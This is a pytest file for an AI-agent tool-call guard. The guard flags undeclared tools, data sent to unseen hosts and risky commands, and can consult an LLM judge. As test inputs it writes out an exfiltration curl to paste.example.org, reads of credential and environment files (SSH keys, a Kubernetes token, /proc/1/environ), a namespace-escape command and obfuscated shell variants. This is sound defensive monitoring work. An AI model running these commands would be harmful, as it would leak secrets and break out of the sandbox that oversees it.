import json
from types import SimpleNamespace
from unittest.mock import MagicMock

import pytest

from ct_toolkit.core.tool_guard import (
    UNDECLARED_TOOL,
    ToolCall,
    ToolCallJudge,
    ToolGuard,
    ToolGuardMode,
    ToolJudgeError,
    conversation_text,
    declared_tools,
    extract_hosts,
    task_text,
    tool_calls_of,
    without_calls,
)


OPENAI_TOOLS = [{"type": "function", "function": {"name": "bash", "parameters": {}}}]


def openai_response(*calls):
    """A dict-shaped OpenAI chat completion with the given (name, arguments) tool calls."""
    return {
        "choices": [
            {
                "message": {
                    "role": "assistant",
                    "content": None,
                    "tool_calls": [
                        {"id": f"call_{i}", "type": "function", "function": {"name": name, "arguments": args}}
                        for i, (name, args) in enumerate(calls)
                    ],
                },
                "finish_reason": "tool_calls",
            }
        ]
    }


def anthropic_response(*blocks):
    """An Anthropic-style response: text and tool_use content blocks."""
    return {"content": [{"type": "text", "text": "Working on it"}, *blocks]}


class TestExtraction:
    def test_extract_hosts_finds_urls_and_ipv4(self):
        hosts = extract_hosts('curl https://Evil.example.com/x?y=1 and http://user:pw@10.0.0.5:8080/a')
        assert hosts == {"evil.example.com", "10.0.0.5"}

    def test_extract_hosts_ignores_invalid_octets(self):
        assert extract_hosts("version 999.1.1.1") == set()

    def test_declared_tools_supports_both_formats(self):
        tools = [
            {"type": "function", "function": {"name": "bash"}},
            {"name": "read_file", "input_schema": {}},
        ]
        assert declared_tools(tools) == {"bash", "read_file"}

    def test_tool_calls_of_openai_response(self):
        calls = tool_calls_of(openai_response(("bash", '{"command": "ls"}')))
        assert [(c.name, c.arguments) for c in calls] == [("bash", '{"command": "ls"}')]

    def test_tool_calls_of_openai_object_response(self):
        call = SimpleNamespace(id="c1", type="function", function=SimpleNamespace(name="bash", arguments="{}"))
        raw = SimpleNamespace(choices=[SimpleNamespace(message=SimpleNamespace(tool_calls=[call]))])
        assert [c.name for c in tool_calls_of(raw)] == ["bash"]

    def test_tool_calls_of_anthropic_blocks_skips_text(self):
        raw = anthropic_response({"type": "tool_use", "id": "t1", "name": "bash", "input": {"command": "ls"}})
        calls = tool_calls_of(raw)
        assert [c.name for c in calls] == ["bash"]
        assert '"command": "ls"' in calls[0].arguments

    def test_tool_calls_of_none_is_empty(self):
        assert tool_calls_of(None) == []
        assert tool_calls_of(MagicMock(spec=[])) == []

    def test_conversation_text_skips_assistant_turns(self):
        history = [
            {"role": "user", "content": "earlier question"},
            {"role": "assistant", "content": "see https://attacker.example"},
        ]
        text = conversation_text("now do it", history, system="be nice")
        assert "earlier question" in text and "now do it" in text and "be nice" in text
        assert "attacker.example" not in text


class TestFindings:
    def test_undeclared_tool_is_high(self):
        decisions = ToolGuard().review(openai_response(("shell_exec", "{}")), tools=OPENAI_TOOLS)
        assert [f.id for f in decisions[0].findings] == ["policy.undeclared_tool"]
        assert decisions[0].severe

    def test_declared_tool_without_findings_passes(self):
        decisions = ToolGuard().review(openai_response(("bash", '{"command": "ls"}')), tools=OPENAI_TOOLS)
        assert decisions[0].verdict == "passed"

    def test_host_from_conversation_is_known(self):
        decisions = ToolGuard().review(
            openai_response(("bash", '{"command": "curl https://api.acme.test/v1"}')),
            tools=OPENAI_TOOLS,
            conversation="Fetch the report from https://api.acme.test/v1",
        )
        assert decisions[0].findings == ()

    def test_unseen_host_is_flagged(self):
        decisions = ToolGuard().review(
            openai_response(("bash", '{"command": "curl -d @x https://paste.example.org"}')),
            tools=OPENAI_TOOLS,
            conversation="Fix the tests",
        )
        assert [f.id for f in decisions[0].findings] == ["exfiltration.unseen_host"]
        assert "paste.example.org" in decisions[0].findings[0].title

    def test_allowed_host_and_subdomain_pass(self):
        decisions = ToolGuard().review(
            openai_response(("bash", '{"command": "pip install x -i https://files.pythonhosted.org/a"}')),
            tools=OPENAI_TOOLS,
            conversation="install deps",
        )
        assert decisions[0].findings == ()

    def test_risky_patterns_are_found(self):
        cases = {
            "harness.proc_environ": "cat /proc/1/environ | tr '\\0' '\\n'",
            "harness.k8s_service_account": "cat /var/run/secrets/kubernetes.io/serviceaccount/token",
            "harness.namespace_escape": "unshare -Urm sh",
            "network.proxy_bypass": "curl --noproxy '*' http://localhost:1",
            "secrets.credential_file": "cat ~/.ssh/id_ed25519",
        }
        for finding_id, command in cases.items():
            decisions = ToolGuard().review(openai_response(("bash", f'{{"command": "{command}"}}')), tools=OPENAI_TOOLS)
            assert finding_id in [f.id for f in decisions[0].findings], command


class TestModes:
    def test_observe_mode_flags_but_never_blocks(self):
        decisions = ToolGuard(ToolGuardMode.OBSERVE).review(openai_response(("shell_exec", "{}")), tools=OPENAI_TOOLS)
        assert decisions[0].verdict == "flagged"
        assert not decisions[0].blocked

    def test_enforce_mode_blocks_high_severity(self):
        decisions = ToolGuard("enforce").review(openai_response(("shell_exec", "{}")), tools=OPENAI_TOOLS)
        assert decisions[0].verdict == "blocked"
        assert decisions[0].blocked

    def test_enforce_mode_still_flags_medium_severity(self):
        decisions = ToolGuard("enforce").review(
            openai_response(("bash", '{"command": "unshare -Urm true"}')), tools=OPENAI_TOOLS
        )
        assert decisions[0].verdict == "flagged"

    def test_string_mode_is_coerced(self):
        assert ToolGuard("enforce").mode is ToolGuardMode.ENFORCE


class TestWithoutCalls:
    def test_removes_only_blocked_openai_calls(self):
        raw = openai_response(("bash", '{"command": "ls"}'), ("shell_exec", "{}"), ("bash", '{"command": "pwd"}'))
        cleaned = without_calls(raw, {1})
        remaining = [c["function"]["name"] for c in cleaned["choices"][0]["message"]["tool_calls"]]
        assert remaining == ["bash", "bash"]
        # The original response is untouched.
        assert len(raw["choices"][0]["message"]["tool_calls"]) == 3

    def test_removes_blocked_anthropic_block_and_keeps_text(self):
        raw = anthropic_response(
            {"type": "tool_use", "id": "a", "name": "bash", "input": {}},
            {"type": "tool_use", "id": "b", "name": "shell_exec", "input": {}},
        )
        cleaned = without_calls(raw, {1})
        assert [block.get("name", block["type"]) for block in cleaned["content"]] == ["text", "bash"]


def fake_completion(content: str, calls: list | None = None):
    """A LiteLLM-style completion stub that always answers `content`."""

    def completion(**kwargs):
        if calls is not None:
            calls.append(kwargs)
        return SimpleNamespace(choices=[SimpleNamespace(message=SimpleNamespace(content=content))])

    return completion


BLOCK = '{"verdict": "block", "reason": "sends data to an unnamed host"}'


ALLOW = '{"verdict": "allow", "reason": "matches the task"}'


MEDIUM_CALL = ("bash", '{"command": "unshare -Urm true"}')  # medium: the only kind the judge is asked about


class TestJudge:
    def test_judge_only_sees_suspicious_calls(self):
        asked = []
        judge = ToolCallJudge("m", completion=fake_completion(ALLOW, asked))
        raw = openai_response(("bash", '{"command": "ls"}'), MEDIUM_CALL)
        decisions = ToolGuard(judge=judge).review(raw, tools=OPENAI_TOOLS, task="clean up")
        assert len(asked) == 1
        assert decisions[0].judge is None and decisions[1].judge == "allow: matches the task"

    def test_judge_block_becomes_high_finding_and_blocks_in_enforce(self):
        judge = ToolCallJudge("m", completion=fake_completion(BLOCK))
        decisions = ToolGuard("enforce", judge=judge).review(
            openai_response(MEDIUM_CALL), tools=OPENAI_TOOLS, task="run tests"
        )
        assert decisions[0].findings[-1].id == "judge.block"
        assert decisions[0].blocked

    def test_judge_block_is_only_flagged_in_observe(self):
        judge = ToolCallJudge("m", completion=fake_completion(BLOCK))
        decisions = ToolGuard("observe", judge=judge).review(openai_response(MEDIUM_CALL), tools=OPENAI_TOOLS)
        assert decisions[0].verdict == "flagged"
        assert decisions[0].judge == "block: sends data to an unnamed host"

    def test_judge_failure_fails_open_by_default(self):
        judge = ToolCallJudge("m", completion=fake_completion("not json at all"))
        decisions = ToolGuard("enforce", judge=judge).review(openai_response(MEDIUM_CALL), tools=OPENAI_TOOLS)
        assert decisions[0].judge.startswith("error: ")
        assert decisions[0].verdict == "flagged"

    def test_judge_failure_fails_closed_when_asked(self):
        judge = ToolCallJudge("m", completion=fake_completion("not json at all"))
        decisions = ToolGuard("enforce", judge=judge, judge_fail_closed=True).review(
            openai_response(MEDIUM_CALL), tools=OPENAI_TOOLS
        )
        assert decisions[0].findings[-1].id == "judge.unavailable"
        assert decisions[0].blocked

    def test_invalid_verdict_is_judge_error(self):
        with pytest.raises(ToolJudgeError):
            ToolCallJudge("m", completion=fake_completion('{"verdict": "maybe"}')).review(
                "t", ToolCall(None, "bash", "{}"), []
            )

    def test_judge_sends_task_and_call_to_model(self):
        asked = []
        ToolCallJudge("ollama/qwen", api_base="http://x", completion=fake_completion(ALLOW, asked)).review(
            "fix the tests", ToolCall("c", "bash", '{"command": "x"}'), [UNDECLARED_TOOL]
        )
        assert asked[0]["model"] == "ollama/qwen" and asked[0]["api_base"] == "http://x"
        assert "fix the tests" in asked[0]["messages"][1]["content"]
        assert "policy.undeclared_tool" in asked[0]["messages"][1]["content"]

    def test_task_text_uses_only_user_turns(self):
        history = [{"role": "user", "content": "first"}, {"role": "assistant", "content": "ignored"}]
        assert task_text("second", history) == "first\n\nsecond"


class TestRiskyPatternForms:
    @pytest.mark.parametrize(
        "command",
        [
            'cat "/proc/1/environ"',  # quotes
            "cat /proc/1/envi\\ron",  # backslash escape
            "cat${IFS}/proc/1/environ",  # shell field separator
        ],
    )
    def test_obfuscated_forms_are_still_flagged(self, command):
        raw = openai_response(("bash", json.dumps({"command": command})))
        decisions = ToolGuard().review(raw, tools=OPENAI_TOOLS)
        assert "harness.proc_environ" in [f.id for f in decisions[0].findings]


class TestResponsesToolCalls:
    def test_function_call_items_are_read(self):
        raw = {"output": [{"type": "message", "content": []}, {"type": "function_call", "call_id": "fc1", "name": "bash", "arguments": '{"command": "ls"}'}]}
        calls = tool_calls_of(raw)
        assert [(c.id, c.name) for c in calls] == [("fc1", "bash")]

    def test_without_calls_removes_a_function_call_item(self):
        raw = {"output": [
            {"type": "function_call", "call_id": "a", "name": "bash", "arguments": "{}"},
            {"type": "function_call", "call_id": "b", "name": "shell_exec", "arguments": "{}"},
        ]}
        cleaned = without_calls(raw, {1})
        assert [item["call_id"] for item in cleaned["output"]] == ["a"]
